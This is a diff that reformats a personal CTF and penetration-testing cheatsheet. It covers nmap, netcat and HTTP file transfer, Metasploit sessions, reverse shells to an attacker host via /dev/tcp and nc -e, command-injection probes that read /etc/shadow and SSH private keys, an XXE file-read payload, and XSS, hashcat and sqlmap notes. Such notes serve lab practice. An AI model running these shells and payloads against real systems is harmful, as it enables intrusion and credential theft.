@@ -1,8 +1,9 @@
 # docs-ctf-cheatsheet
 ### NMAP:
-```shell nmap -sC -sV -oA nmap/initial IPADRESS``` (standart)
-
-```shell nmap -p- -T5 -sC -sV -oA nmap/second IPADRESS``` (quick scan of all ports)
+```bash
+nmap -sC -sV -oA nmap/initial IPADRESS
+nmap -p- -T5 -sC -sV -oA nmap/second IPADRESS
+```
 
 -A : Enables OS Detection, Version Detection, Script Scanning and Traceroute all in one
 
@@ -15,60 +16,58 @@
 -oA [dir] all output to [dir]
 
 ### NETCAT:
-send data:
+#### send data:
 
 reciever:
-```shell
+```bash
 nc -l -p 1234 > FILE.NAME
 ```
 (sometimes netcat instead of nc!)
 
+
 sender:
-```shell
+```bash
 nc -w 3 DESTINATION 1234 < FILE.NAME
 ```
 
 ### MSF:
 search:
-```shell
+```bash
 search [SEARCHTERM]
 ```
 send data:
-```shell
+```bash
 upload /path/to/file
 ```
 run exploit in background and enter the session:
-```shell
+```bash
 run -j
 ```
 sessions:
-```shell
+```bash
 sessions -i [session id]
 ```
 get "normal" shell:
-```shell
+```bash
 shell
 ```
 move out of a session:
-```shell
+```bash
 ctrl+z
 ```
 
 ### HTTPSERVER:
-send data:
+#### send data:
 
 sender:
-```shell
+```bash
 python -m SimpleHTTPServer 8083
 python3 -m http.server 8083
 ```
 reciever:
-```shell
+```bash
 curl IPADRESSSENDER:8083/FILE.NAME
-curl 10.10.14.145:8083/47502.py > hmm.py
-```
-OR
-```shell
+curl 10.10.IP.IP:8083/linpeas.sh > lp.sh
 wget IPADRESSSENDER:8083/FILE.NAME
 ```
 
@@ -76,44 +75,44 @@ wget IPADRESSSENDER:8083/FILE.NAME
 1. setup listener on my machine:
 nc -lvnp 8081
 2. go to
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 and try them out on target machine
-easiest rs : ;nc -e /bin/bash
 
-### INTERACTIVE SHELL:
-target:
-	export RHOST=<IPADRESSATTACKER>
-attacker:
-	nc -lp 14445
-target:
-	bash -c 'bash -i &>/dev/tcp/$RHOST/14445 0<&1'
-attacker (now on targetshell):
-	python -c 'import pty; pty.spawn("/bin/bash")'
-	OR
-	python3 -c 'import pty; pty.spawn("/bin/bash")'
+easiest rs :
+```bash
+bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
+```
+
+### EVEN MORE INTERACTIVE SHELL:
+target: `python3 -c 'import pty;pty.spawn("/bin/bash")'`, hit <kbd>CTRL</kbd> + <kbd>z</kbd>
+attacker: `stty raw -echo`, `fg`, <kbd>Enter</kbd>, <kbd>Enter</kbd>
 
 ### COMMAND INJECTION
-Linux
+#### Linux
+```bash
 whoami
 id
-ifconfig/ip addr
+ifconfig
+ip addr
 uname -a
 ps -ef
 cat /etc/passwd
 cat /etc/shadow
 cat /home/USERNAME/.ssh/id_rsa
-Windows
+```
+#### Windows
+``` shell
 whoami
 ver
 ipconfig
 tasklist
 netstat -an
+```
 
 ### CHECK IF SOMETHING IS EXECUTED
-attacker:
-	sudo tcpdump ip proto \\icmp -i tun0
-target:
-	ping [local tun0 ip] -c 1
+attacker: `sudo tcpdump ip proto \icmp -i tun0`
+target: `ping [local tun0 ip] -c 1`
 
 ### BROKEN AUTHENTICATION:
 password guessing/bruteforce
@@ -124,15 +123,19 @@ reregistration of existing user “ admin” (with space) and gain all rights of
 
 ### XML EXTERNAL ENTITY (XXE):
 try :
+```xml
 <?xml version="1.0"?>
 <!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
 <root>&read;</root>
+```
+```xml
 and:
 <!DOCTYPE replace [<!ENTITY name "success"> ]>
  <userInfo>
   <firstName>xxe</firstName>
   <lastName>&name;</lastName>
  </userInfo>
+```
 
 ### XSS PAYLOADS:
 Popup's (<script>alert(“Hello World”)</script>) - Creates a Hello World message popup on a users browser.
@@ -216,9 +219,9 @@ some programs run only with a certain jre, so you can use the following to set t
 sudo archlinux-java set java-8-openjdk/jre
 
 ### TMUX:
-	neue tmux session in gewünschter directory starten:
-		tmux new -s [NAME]
-	new  panel
+neue tmux session in gewünschter directory starten:
+`tmux new -s [NAME]`
+new  panel
 CMD+B, c
 rename panel
 	CMD+B, ,
@@ -245,7 +248,7 @@ HASHTYPE : tunnelsup.com/hash-analyzer/, hashcat.net/wiki/doku.php?id=example_ha
 PATHTORULE : \rules\best64.rule is good
 
 ### SQLMAP
-```shell
+```bash
 sqlmap -r [FULLFILEPATHTOREQUEST] -dump
 ```
 --dbs : dump database names
